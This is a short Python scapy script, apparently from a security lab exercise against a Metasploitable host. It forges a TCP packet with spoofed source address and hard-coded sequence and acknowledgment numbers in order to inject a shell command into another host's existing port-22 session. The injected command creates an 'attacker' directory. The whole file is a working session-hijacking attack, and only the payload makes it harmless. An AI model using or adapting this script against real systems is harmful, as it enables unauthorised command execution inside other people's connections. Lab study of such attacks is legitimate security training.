#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.200", dst = "10.10.10.196")
TCPLayer = TCP (sport=42722, dport=22, flags="A", seq=2759247166, ack=288601948)

data = "\n mkdir /home/msfadmin/attacker \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)

send(pkt,verbose=0)
